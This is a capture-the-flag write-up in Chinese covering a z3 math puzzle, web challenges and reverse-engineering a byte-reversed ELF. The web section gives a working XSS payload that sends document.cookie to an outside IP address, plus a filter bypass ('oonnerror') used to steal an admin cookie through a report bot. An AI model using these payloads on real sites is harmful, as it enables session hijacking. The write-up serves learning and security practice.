+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> Real, BitVecRef, BitVecVal, Int, Extract, Solver, SolverFor, Concat, Or, And, If, sat, simplify, LShR, Sum, URem, UDiv, set_option, Tactic</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    x = [Int(<span class="string">&#x27;apple&#x27;</span>), Int(<span class="string">&#x27;orange&#x27;</span>), Int(<span class="string">&#x27;lemon&#x27;</span>)]</span><br><span class="line">    s = Solver()</span><br><span class="line">    s.add(x[<span class="number">0</span>]*x[<span class="number">0</span>]+x[<span class="number">1</span>]*x[<span class="number">1</span>] == <span class="number">256325</span>)</span><br><span class="line">    s.add(x[<span class="number">0</span>]*x[<span class="number">2</span>] == x[<span class="number">1</span>]*<span class="number">13910</span>+<span class="number">441</span>)</span><br><span class="line">    <span class="keyword">while</span> (t := s.check()) == sat:</span><br><span class="line">        m = s.model()</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line">        apple, orange, lemon = [m[x[i]].as_long() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">3</span>**apple == (orange**<span class="number">3</span>+lemon))</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">pow</span>(orange, apple, lemon))</span><br><span class="line">        s.add(Or([x[i] != m[x[i]].as_long() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]))</span><br><span class="line">    <span class="built_in">print</span>(t)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>這題其實很玄，因為一開始用z3正常的方式解三元方程式可是一直解不出答案，後來換個方式去算<br><img src="https://i.imgur.com/YW8iekl.png" alt=""></p>
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Are-you-admin"><a href="#Are-you-admin" class="headerlink" title="Are you admin?"></a>Are you admin?</h3><p>登入後發現有一個 /flag1 的頁面，不過 get 該頁面時會回傳 <code>&#123;&quot;done&quot;:false,&quot;msg&quot;:&quot;Not admin :(&quot;&#125;</code>, 發現 cookie 中有一個 is_admin，當 is_admin 為 true 時，便能成功讀取 /flag 頁面中的 flag。<br><img src="https://i.imgur.com/6JsxjQE.png" alt=""><br><img src="https://i.imgur.com/xP5zszv.png" alt=""></p>
+<h3 id="Login-as-ADMIN"><a href="#Login-as-ADMIN" class="headerlink" title="Login as ADMIN ?"></a>Login as ADMIN ?</h3><p>接着發現網站上有兩個頁面 /note.html 以及 /share, /note 中有一個能夠上傳字串到服務器的功能（類似論壇）,或許會有 XSS 的問題。同過 payload: <code>&lt;h1&gt;aaaaaa&lt;/h1&gt;</code> 的測試後發現 XSS 問題確實存在。</p>
+<p>接着 /report 頁面似乎提供服務器主動訪問目標 url 的功能，首先來驗證服務器是否對外連網，可以使用 <code>python3 -m http.server &lt;your_port&gt;</code> 或是 <code>tcpdump -i &lt;your_interface&gt; port &lt;your port&gt;</code> 進行測試，驗證了服務器有對外連線。<br><img src="https://i.imgur.com/MvAQZmt.png" alt=""></p>
+<p>看起來 /report 頁面會使服務器用 get 方式訪問 url，因此這裡或許可以使用不需要 victim 互動的 reflected XSS。</p>
+<p>在 notes 頁面中通過 payload:<code>&lt;img src=x onerror=this.src=&#39;http://27.147.28.70:9945/?&#39;+document.cookie;&gt;</code> 驗證此 payload 的有效性<br><img src="https://i.imgur.com/QCaGOUG.png" alt=""></p>
+<p>不過在 share 頁面中卻無效了，review 過 /share 頁面的原始碼後發現該頁面有客戶端的 filter，該 filter 會將 on 以及 ig 字串刪除。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">(<span class="title function_">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; done, note &#125; = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/share&#x27;</span>+location.<span class="property">search</span>).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="title function_">json</span>())</span><br><span class="line">    <span class="keyword">if</span> (!done) <span class="keyword">return</span> <span class="title function_">alert</span>(msg || <span class="string">&quot;Unknown error&quot;</span>)</span><br><span class="line">    content.<span class="property">innerHTML</span> = (note || <span class="string">&quot;&quot;</span>).<span class="title function_">replaceAll</span>(<span class="string">&#x27;&lt;/pre&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>).<span class="title function_">replaceAll</span>(<span class="regexp">/on/ig</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#125;)()</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>而想要繞過也很簡單，我們可以將 onerror 修改為 oonnerror，因此整體 payload 為：<code>&lt;img src=x oonnerror=this.src=&#39;http://27.147.28.70:9945/?&#39;+document.cookie;&gt;</code><br>將含有該 payload 的 /share 頁面作為 /report 頁面的 url 後，相當於對服務器主機發起 reflect XSS 攻擊，最終能成功取得主機的 cookie。<br><img src="https://i.imgur.com/YQEVzxJ.png" alt=""></p>
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h3><p>使用 <a target="_blank" rel="noopener" href="https://github.com/rocky/python-uncompyle6/">uncompyle6</a> 將 .pyc 逆向回 .py，<br>可以發現 .py 中驗證機制如何運作，<br>密碼是 20 位數字，具體我忘了，但反正有 flag 就好 科科<br><img src="https://i.imgur.com/bSEwyxf.png" alt=""></p>
+<h3 id="Reverse-1"><a href="#Reverse-1" class="headerlink" title="Reverse"></a>Reverse</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ file reverse</span><br><span class="line">reverse: data</span><br><span class="line">❯ xxd reverse</span><br><span class="line">00000000: 0000 0000 0000 0000 0000 0000 0000 0001  ................</span><br><span class="line">&lt;skip&gt;</span><br><span class="line">00004830: 4429 0f20 3a67 6e69 7274 73b8 4800 4824  D). :gnirts.H.H$</span><br><span class="line">00004840: 44c6 3024 7c8d 48c0 3100 0000 d824 8489  D.0$|.H.1....$..</span><br><span class="line">&lt;skip&gt;</span><br><span class="line">000053a0: 0000 0000 0000 656c 6261 5465 6e6f 6c43  ......elbaTenolC</span><br><span class="line">000053b0: 4d54 7265 7473 6967 6572 5f4d 5449 5f00  MTretsiger_MTI_.</span><br><span class="line">000053c0: 5f5f 7472 6174 735f 6e6f 6d67 5f5f 0065  __trats_nomg__.e</span><br><span class="line">000053d0: 6c62 6154 656e 6f6c 434d 5472 6574 7369  lbaTenolCMTretsi</span><br><span class="line">000053e0: 6765 7265 645f 4d54 495f 0035 2e32 2e32  gered_MTI_.5.2.2</span><br><span class="line">000053f0: 5f43 4249 4c47 0034 2e32 5f43 4249 4c47  _CBILG.4.2_CBILG</span><br><span class="line">00005400: 0034 2e33 2e32 5f43 4249 4c47 0037 2e32  .4.3.2_CBILG.7.2</span><br><span class="line">00005410: 5f43 4249 4c47 006e 6961 6d5f 7472 6174  _CBILG.niam_trat</span><br><span class="line">00005420: 735f 6362 696c 5f5f 0070 6d63 7274 7300  s_cbil__.pmcrts.</span><br><span class="line">00005430: 6b68 635f 6674 6e69 7270 735f 5f00 657a  khc_ftnirps__.ez</span><br><span class="line">00005440: 696c 616e 6966 5f61 7863 5f5f 006e 656c  ilanif_axc__.nel</span><br><span class="line">00005450: 7274 7300 6c69 6166 5f6b 6863 5f6b 6361  rts.liaf_khc_kca</span><br><span class="line">00005460: 7473 5f5f 0073 7475 7000 666e 6163 735f  ts__.stup.fnacs_</span><br><span class="line">00005470: 3939 636f 7369 5f5f 0062 6f72 666d 656d  99cosi__.borfmem</span><br><span class="line">00005480: 006b 6863 5f66 746e 6972 705f 5f00 362e  .khc_ftnirp__.6.</span><br><span class="line">00005490: 6f73 2e63 6269 6c00 0000 0000 0000 0000  os.cbil.........</span><br><span class="line">&lt;skip&gt;</span><br><span class="line">00005920: 0000 0000 0000 0318 0000 0000 0000 0318  ................</span><br><span class="line">00005930: 0000 0004 0000 0003 0000 0000 0000 0008  ................</span><br><span class="line">00005940: 0000 0000 0000 02d8 0000 0000 0000 02d8  ................</span><br><span class="line">00005950: 0000 0000 0000 0040 0000 0000 0000 0040  .......@.......@</span><br><span class="line">00005960: 0000 0000 0000 0040 0000 0004 0000 0006  .......@........</span><br><span class="line">00005970: 0025 0026 0040 000d 0038 0040 0000 0000  .%.&amp;.@...8.@....</span><br><span class="line">00005980: 0000 0000 0000 5030 0000 0000 0000 0040  ......P0.......@</span><br><span class="line">00005990: 0000 0000 0000 12a0 0000 0001 003e 0003  .............&gt;..</span><br><span class="line">000059a0: 0000 0000 0000 0000 0001 0102 464c 457f  ............FLE.</span><br></pre></td></tr></table></figure>
+<p>看到最後的 FLE. 以及中間的字串基本能確定這是一個經過了翻轉的 ELF 檔案。 </p>
+<p>查到<a target="_blank" rel="noopener" href="https://unix.stackexchange.com/questions/416401/how-to-reverse-the-content-of-binary-file">本網站</a>，把整個檔案倒過來：<code>&lt; reverse xxd -p -c1 | tac | xxd -p -r &gt; reverse_out</code></p>
+<p>使用 ghidra 的反編譯進行逆向後可見：<br><img src="https://i.imgur.com/yb4S9SP.png" alt=""></p>
+<p>單純反組譯：<br><img src="https://i.imgur.com/y9HzSmG.png" alt=""></p>
+<p>使用動態分析方式在 <code>call memfrob</code> 後下斷點，然後直接觀察 magic 變數的值。<br><img src="https://i.imgur.com/6gi229J.png" alt=""><br>var_8h（也就是 magic）的 hex 值轉換為 ASCII 為 “esrever”</p>
+<p><img src="https://i.imgur.com/GGGNbax.png" alt=""></p>
 
       
     </div>
